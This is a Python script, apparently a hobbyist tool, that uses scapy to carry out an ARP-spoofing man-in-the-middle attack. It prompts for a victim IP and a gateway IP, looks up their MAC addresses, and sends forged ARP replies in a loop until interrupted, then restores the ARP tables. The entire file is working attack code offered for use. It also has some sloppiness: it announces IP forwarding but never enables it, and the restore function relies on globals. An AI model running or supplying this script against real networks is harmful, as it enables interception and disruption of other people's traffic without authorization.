from pip._vendor.distlib.compat import raw_input
from scapy.all import *
import sys
import os
import time
from scapy.layers.l2 import ARP, Ether

""""let's import everything from scapy, you need to install scapy package"""

def poison(gMac, vMac, gIp, vIp):
    send(ARP(op=2, pdst=vIp, psrc=gIp, hwdst=vMac), verbose=0)
    send(ARP(op=2, pdst=gIp, psrc=vIp, hwdst=gMac), verbose=0)


def cure(gMac, vMac, gIp, vIp):
    send(ARP(op=2, pdst=gatewIp, psrc=victimIp, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=victimMac), count=5)
    send(ARP(op=2, pdst=victimIp, psrc=gatewIp, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewMac), count=5)


def attack():
        try:
            print("I am gonna perform MiM attack ... ")
            print("If you want to sto the attack press 'CONTROL+C' ")
            while True:
                poison(gatewMac, victimMac, gatewIp, victimIp)
                time.sleep(5)
        except KeyboardInterrupt:
                print("Restoring...")
                cure(gatewMac, victimMac, gatewIp, victimIp)
                print("exiting..")
                sys.exit(1)


interface = raw_input("Enter you system interface")
victimIp = raw_input("Enter the IP of the victim")
gatewIp = raw_input("Enter the the IP of the router")
print("Enabling IP forwarding")


try:
    """by using ARP protocol we are able to store the MAC addresses of the victim"""
    victimAns, VictimUnAns = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=victimIp), timeout=2, iface=interface, inter=0.1)
    victimMac = victimAns[0][1].hwsrc
    gatewayAns, GatewayUnANS = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=gatewIp), timeout=2, iface=interface, inter=0.1)
    gatewMac = gatewayAns[0][1].hwsrc
    print("You have found the Mac addresses of the : ")
    print("Gatewat MAC : " + gatewMac)
    print("Victim Mac : " + victimMac)
except Exception:
    print("There is an unexpected error")
    sys.exit(1)

attack()

